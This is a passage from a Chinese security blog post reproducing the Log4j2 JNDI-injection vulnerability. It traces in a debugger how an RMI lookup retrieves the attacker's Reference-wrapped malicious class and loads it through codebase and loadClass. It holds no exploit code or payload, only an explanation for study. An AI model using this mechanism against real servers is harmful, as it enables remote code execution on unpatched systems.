<p>这里需要强制步入this.context.lookup(name);，先是会进入getURLOrDefaultInitCtx()，这一步呢主要就是为给定的 URL 方案 ID 创建一个上下文，这个方案id就是getURLScheme返回的字符，也就是rmi或者ldap等，<a target="_blank" rel="noopener" href="https://docs.oracle.com/en/java/javase/11/docs/api//java.naming/javax/naming/spi/NamingManager.html#getURLContext(java.lang.String,java.util.Hashtable)">getURLContext()官方文档</a>，主要感觉就是返回对应的类型，以便后面确定对应的方法函数。<br><img src="https://s2.loli.net/2022/02/19/QSlX9VAwu2me3Mn.png"><br>继续跟进，会发现又调用一个lookup的实现方法。<br><img src="https://s2.loli.net/2022/02/19/dWznPfsXZ1QuxKa.png"><br>跟进getRootURLContext会发现，其实这个函数就是在解析我们的upl，ip和端口以及未能解析的部分，并返回一个ResolveResult的类来表示名称解析的结果。<a target="_blank" rel="noopener" href="https://www.runoob.com/manual/jdk1.6/java.naming/javax/naming/spi/ResolveResult.html">Class ResolveResult</a><br><img src="https://s2.loli.net/2022/02/19/W5BkHqcQeY2ZM38.png"><br>函数返回后我们看var2，可以发现    remainingName=”evil”，也就是未能解析的部分。</p>
<p>接着会调用getResolvedObj来检索解析成功的对象，也就是ip和port给到var3。</p>
<p>紧接着，又会将var2作为某个lookup的方法的参数，执行lookup函数，跟进这个lookup函数，发现又将会调用一个lookup方法，并且在最后解密一个对象。<br><img src="https://s2.loli.net/2022/02/19/vKSL69nkTfmYCZs.png"><br>跟进RegistryImpl_Stub()的lookup，这里好像调试不了，但是通过官方文档可以知道，这是在返回绑定到此注册表中指定的远程引用，也就是我们在攻击服务端注册的远程对象。<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/api/java/rmi/registry/Registry.html">java.rmi.registry</a><br><img src="https://s2.loli.net/2022/02/19/wMlV3FJAu4q5npx.png"><br>接下来跟进decodeObject(var2, var1.getPrefix(1))</p>
<p>f7步入，跟到这个地方会发现，所以getReference就是在获取我们之前用Reference包装的那个恶意类，并返回给了var3。<br><img src="https://s2.loli.net/2022/02/19/hKpykPnsrzEt7fa.png"><br>紧接着，调用getObjectInstance()，使用位置或引用信息以及指定的属性创建对象，<a target="_blank" rel="noopener" href="https://www.runoob.com/manual/jdk11api/java.naming/javax/naming/spi/DirObjectFactory.html#getObjectInstance(java.lang.Object,javax.naming.Name,javax.naming.Context,java.util.Hashtable,javax.naming.directory.Attributes)">getObjectInstance</a>。<br><img src="https://s2.loli.net/2022/02/19/fdg7EsSyYPelhIv.png"></p>
<p>跟进getObjectInstance看看，究竟是如何执行的。</p>
<p>这里我们先了解一个名词Codebase：简单说，codebase就是远程装载类的路径。当对象发送者序列化对象时，会在序列化流中附加上codebase的信息。 这个信息告诉接收方到什么地方寻找该对象的执行代码。<a target="_blank" rel="noopener" href="https://blog.csdn.net/bigtree_3721/article/details/50614289">https://blog.csdn.net/bigtree_3721/article/details/50614289</a></p>
<p>然后再看看ObjectFactory，<a target="_blank" rel="noopener" href="https://www.runoob.com/manual/jdk11api/java.naming/javax/naming/spi/ObjectFactory.html">https://www.runoob.com/manual/jdk11api/java.naming/javax/naming/spi/ObjectFactory.html</a></p>
<p><img src="https://s2.loli.net/2022/02/19/txKjhgvEPZJY2dW.png"><br>然后跟进这个函数，会发现有个loadclass函数。<br><img src="https://s2.loli.net/2022/02/19/6Cx8SBYIRQvelMW.png"><br>最后如果一步步跟loadclass就会发现代码将跑到我们的恶意类那里去。</p>
<p>reference：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yyhuni/p/15083613.html">jndi注入调试</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞其实主要还是jndi注入，Log4j2只是恰好提供了jndi的lookup，漏洞分析过程中也是查询和借鉴了大量的文章，也算是学到了很多。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">The_Itach1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/19/Log4j%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">http://example.com/2022/02/19/Log4j%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/cve/">cve</a><a class="post-meta__tags" href="/tags/java/">java</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/02/19/mcDBoNOdi34ul2P.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/25/hgame%202022%20Re/"><img class="prev-cover" src="https://s2.loli.net/2022/02/25/TD8lZVdK6XLFOuG.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">hgame 2022 re wp</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/31/Windows-Hack-Programming/"><img class="next-cover" src="https://s2.loli.net/2022/01/31/ktMQEOe8CgB9LJD.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Windows-Hack-Programming</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">The_Itach1</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">52</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Log4j2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">Log4j2 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFLog4J"><span class="toc-number">1.1.</span> <span class="toc-text">什么是Log4J</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Log4j2-%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">Log4j2 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j2%E7%9A%84Lookups"><span class="toc-number">1.2.1.</span> <span class="toc-text">Log4j2的Lookups</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5-RMI"><span class="toc-number">1.2.2.</span> <span class="toc-text">JNDI注入+RMI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Log4j2-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">Log4j2 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">配置环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">调试过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#context-lookup"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">context.lookup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jndi%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">jndi注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/Recent%20CTF%20summary/" title="Recent CTF summary"><img src="https://s2.loli.net/2022/06/10/HR1Wcv8IJAznUOd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Recent CTF summary"/></a><div class="content"><a class="title" href="/2022/06/11/Recent%20CTF%20summary/" title="Recent CTF summary">Recent CTF summary</a><time datetime="2022-06-11T09:38:45.000Z" title="Created 2022-06-11 17:38:45">2022-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/win32%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="win32编程学习笔记"><img src="https://i.loli.net/2021/03/30/n7siDC4uFlg8SLv.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="win32编程学习笔记"/></a><div class="content"><a class="title" href="/2022/06/11/win32%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="win32编程学习笔记">win32编程学习笔记</a><time datetime="2022-06-10T17:10:13.923Z" title="Created 2022-06-11 01:10:13">2022-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/30/Simple%20Exe%20Packing/" title="Simple Exe Packing"><img src="https://s2.loli.net/2022/03/30/cVsNfuSDZGqMO4r.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Simple Exe Packing"/></a><div class="content"><a class="title" href="/2022/03/30/Simple%20Exe%20Packing/" title="Simple Exe Packing">Simple Exe Packing</a><time datetime="2022-03-30T10:38:45.000Z" title="Created 2022-03-30 18:38:45">2022-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/15/OWASP%20Top%2010%20learning/" title="OWASP Top 10 learning"><img src="https://s2.loli.net/2022/03/15/Afs4qw2QXxeUHlO.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="OWASP Top 10 learning"/></a><div class="content"><a class="title" href="/2022/03/15/OWASP%20Top%2010%20learning/" title="OWASP Top 10 learning">OWASP Top 10 learning</a><time datetime="2022-03-15T10:38:45.000Z" title="Created 2022-03-15 18:38:45">2022-03-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/25/%E5%90%91%E6%97%A5%E8%91%B5%20CNVD-2022-10270%E5%88%86%E6%9E%90/" title="向日葵 CNVD-2022-10270分析"><img src="https://s2.loli.net/2022/02/25/v2oYBbMdSCqf3gc.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="向日葵 CNVD-2022-10270分析"/></a><div class="content"><a class="title" href="/2022/02/25/%E5%90%91%E6%97%A5%E8%91%B5%20CNVD-2022-10270%E5%88%86%E6%9E%90/" title="向日葵 CNVD-2022-10270分析">向日葵 CNVD-2022-10270分析</a><time datetime="2022-02-25T10:38:45.000Z" title="Created 2022-02-25 18:38:45">2022-02-25</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://s2.loli.net/2022/02/19/mcDBoNOdi34ul2P.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By The_Itach1</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">木叶飞舞之处，火亦生生不息</div><div class="icp"><a><span></span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>